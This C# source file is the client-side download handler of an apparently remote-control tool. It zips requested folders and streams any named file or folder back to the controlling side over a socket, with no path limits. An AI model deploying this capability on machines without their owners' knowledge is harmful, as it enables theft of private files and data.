using System;
using System.IO;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    partial class RequestDownloadHandler : AbstractRequestHandler
    {
        private bool _isRunning = false;
        private RequestStartDownload _request = null;
        private string _transferPath = null;
        private bool _deleteTransferFileWhenDone = false;

        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_START_DOWNLOAD_REQUEST)
            {
                RequestStartDownload req = reqObj as RequestStartDownload;
                if (req == null)
                    return;

                if (_request != null)
                    return;

                try
                {
                    PrepareDownload(req, session);
                    RunTaskThread(StartDownload, session);
                }
                catch (Exception ex)
                {
                    ResetState();
                    SendDownloadError(session, ex);
                }
            }
            else if (reqType == ePacketType.PACKET_STOP_DOWNLOAD_REQUEST)
            {
                _isRunning = false;
            }
        }

        private void PrepareDownload(RequestStartDownload req, SocketSession session)
        {
            _request = req;
            _isRunning = true;
            _deleteTransferFileWhenDone = false;

            string transferPath = req.Path;
            string displayPath = req.Path;
            if (req.PathType == ePathType.Directory)
            {
                transferPath = CreateDirectoryZip(req.Path);
                displayPath = req.Path.TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar) + ".zip";
                _deleteTransferFileWhenDone = true;
            }

            _transferPath = transferPath;
            ResponseStartDownloadHeader headerResp = new ResponseStartDownloadHeader();
            using (FileStream fs = File.Open(transferPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                headerResp.FileSize = fs.Length;
                headerResp.Path = displayPath;
                headerResp.SavePath = req.SavePath;
            }
            session.Send(ePacketType.PACKET_START_DOWNLOAD_HEADER_RESPONSE, headerResp);
        }

        private void StartDownload(SocketSession session)
        {
            try
            {
                using (FileStream fs = new FileStream(_transferPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    byte[] buffer = new byte[8192];
                    while (_isRunning)
                    {
                        int size = fs.Read(buffer, 0, buffer.Length);
                        if (size < 1)
                            break;

                        ResponseStartDownload resp = new ResponseStartDownload();
                        resp.Data = new byte[size];
                        Buffer.BlockCopy(buffer, 0, resp.Data, 0, size);
                        session.Send(ePacketType.PACKET_START_DOWNLOAD_RESPONSE, resp);
                    }
                }
            }
            catch (Exception ex)
            {
                SendDownloadError(session, ex);
            }
            finally
            {
                CleanupTempTransferFile();
                ResetState();
            }
        }

        private void ResetState()
        {
            _request = null;
            _transferPath = null;
            _deleteTransferFileWhenDone = false;
            _isRunning = false;
        }

        private void CleanupTempTransferFile()
        {
            if (!_deleteTransferFileWhenDone || string.IsNullOrEmpty(_transferPath))
                return;

            try
            {
                if (File.Exists(_transferPath))
                    File.Delete(_transferPath);
            }
            catch
            {
            }
        }

        private void SendDownloadError(SocketSession session, Exception ex)
        {
            ResponseStartDownload resp = new ResponseStartDownload();
            resp.Result = false;
            resp.Message = ex.Message;
            resp.Detail = ex.ToString();
            session.Send(ePacketType.PACKET_START_DOWNLOAD_RESPONSE, resp);
        }

        private static string CreateDirectoryZip(string sourceDir)
        {
            if (string.IsNullOrEmpty(sourceDir) || !Directory.Exists(sourceDir))
                throw new DirectoryNotFoundException(sourceDir);

            string tempFile = Path.Combine(
                Path.GetTempPath(),
                "rc_download_" + Guid.NewGuid().ToString("N") + ".zip");

            ZipStoreWriter.CreateFromDirectory(sourceDir, tempFile);
            return tempFile;
        }

    }
}
